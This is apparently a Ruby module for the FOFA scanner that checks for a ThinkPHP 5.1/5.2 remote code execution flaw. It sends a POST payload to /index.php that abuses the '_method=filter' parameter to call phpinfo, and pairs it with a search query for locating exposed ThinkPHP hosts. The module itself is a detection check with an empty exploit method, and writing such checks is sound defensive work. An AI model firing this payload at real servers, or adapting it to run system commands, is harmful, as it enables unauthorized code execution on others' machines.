if __FILE__ == $0
  require_relative '../fofascan'
end

require 'fofa_core'

class FofaExploits < Fofa::Exploit
  def get_info
	{
      "Name": "thinkphp5.1-2 rce",
      "Description": "thinkphp5.1-2 rce",
      "Product": "ThinkPHP",
      "Homepage": "http://www.thinkphp.cn",
      "DisclosureDate": "2019-01-15",
      "Author": "linlanxi7552659@gmail.com",
      "FofaQuery": "app=\"ThinkPHP\"",
      "Level": "3",
      "Impact": "<p>黑客可在服务器上执行任意命令，写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。</p>",
      "Recommandation": "<p>严格过滤用户输入的数据，禁止执行系统命令。</p>",
      "References": [
            "http://115.198.56.141:19300/wordpress/index.php/2019/01/15/thinkphp5-1-5-2-rec/"
      ],
      "HasExp": false,
      "ExpParams": [],
      "is0day": false,
      "ExpTips": {
            "type": "Tips",
            "content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/index.php",
                        "follow_redirect": true,
                        "header": {},
                        "data_type": "text",
                        "data": "c=phpinfo&&f=1&&_method=filter&"
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "PHP Version",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "fofacli_version": "3.10.2",
      "fofascan_version": "0.1.16",
      "Posttime": "2019-01-15 17:51:26",
      "status": 2
}
	end


  def initialize(info = {})
    super( info.merge(get_info()) )
  end

  def vulnerable(hostinfo)
    excute_scansteps(hostinfo) if @info['ScanSteps']
  end

  def exploit(hostinfo)
  end
end
if __FILE__ == $0
  do_my_scan($0, ARGV)
end